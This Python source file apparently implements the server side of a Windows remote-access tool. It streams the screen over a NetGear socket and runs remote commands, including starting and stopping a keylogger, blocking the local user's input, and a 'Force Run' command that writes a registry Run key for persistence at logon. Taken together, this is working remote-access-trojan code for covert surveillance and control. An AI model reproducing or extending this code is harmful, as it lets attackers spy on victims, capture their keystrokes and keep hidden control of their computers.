from externals.vidgear.gears import ScreenGear
from externals.vidgear.gears import NetGear
from collections import deque
from helpers.executor import Executor
from helpers.inputListener import Listener
import cv2
from time import perf_counter
from threading import Thread
from numpy import flip
from winreg import OpenKeyEx, SetValueEx, CloseKey, HKEY_CURRENT_USER, REG_SZ, KEY_SET_VALUE
from os.path import realpath, dirname



class Server():
    def __init__(self, ip):
        self.resolutionWidth = 1200
        self.resolutionHeight = 900

        self.executor = Executor()

        options = {"jpeg_compression": True,
                   "jpeg_compression_fastdct": True,
                   "jpeg_compression_fastupsample": True,
                   "jpeg_compression_quality": 50,
                   "rle_compression": True,
                   "rle_compression_strength": 3,
                   "bidirectional_mode": True,
                   "max_retries": 1
        }

        self.server = NetGear(
            address=ip,
            port="5900",
            protocol="tcp",
            pattern=1,
            logging=False,
            retCh=True,
            **options
        )

        self.server.inpListener.grabMouseInput = False

        self.stream = ScreenGear(backend="mss",
                            monitor=1,
                            #colorspace="COLOR_BGR2RGB",
                            logging=False).start()

        self.__running = True


    def start(self):
        self.__proc = Thread(target=self.__start)
        self.__proc.daemon = True
        self.__proc.start()


    def __start(self):
        while self.__running:
            frame = self.stream.read()
            frame = flip(frame[:, :, :3], 2)
            frame = cv2.resize(frame, (self.resolutionWidth, self.resolutionHeight), interpolation=cv2.INTER_LANCZOS4)
            return_data = self.server.send(frame, None)
            if return_data:
                status_code, data = return_data
                if status_code:
                    return

                if len(data) == 2:
                    cmdQueue = deque(data[0])
                    inputQueue = deque(data[1])

                    self.executor.execute(inputQueue)

                    while cmdQueue: #while queue is not empty
                        item = cmdQueue.popleft()
                        cmd = item[0]
                        args = item[1:]
                        if cmd == "Start Cam":
                            pass

                        elif cmd == "Stop Cam":
                            pass

                        elif cmd == "Force Run":
                            keyHandle = OpenKeyEx(HKEY_CURRENT_USER, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", access=KEY_SET_VALUE)
                            SetValueEx(keyHandle, "remote", 0, REG_SZ, dirname(realpath(__file__)) + r"\helpers\run.py")
                            CloseKey(keyHandle)

                        elif cmd == "Block Input":
                            self.server.inpListener.blockInput = True

                        elif cmd == "Unblock Input":
                            self.server.inpListener.blockInput = False

                        elif cmd == "Start KeyLogger":
                            self.server.inpListener.grabKeyInput = True

                        elif cmd == "Stop KeyLogger":
                            self.server.inpListener.grabKeyInput = False

                        elif cmd == "Width Change":
                            self.resolutionWidth = args[0]

                        elif cmd == "Height Change":
                            self.resolutionHeight = args[0]

                        elif cmd == "Fps Change":
                            self.stream.minFrameDelta = args[0]

                else:
                    inputQueue = deque(data[0])

                    self.executor.execute(inputQueue)

            #halt(minFrameDelta - (frameEnd - frameStart))
            #framesTotalTime += perf_counter() - frameStart
            #cv2.imshow("frame", frame)
            #frameWaitPeriodEnd = perf_counter()
            #key = cv2.waitKey(1) & 0xFF
            #if key == ord("q"):
            #    break


    def close(self):
        self.__running = False
        self.__proc.join()
        self.server.inpListener.stop()
        self.executor.close()
        self.stream.stop()
        self.server.close()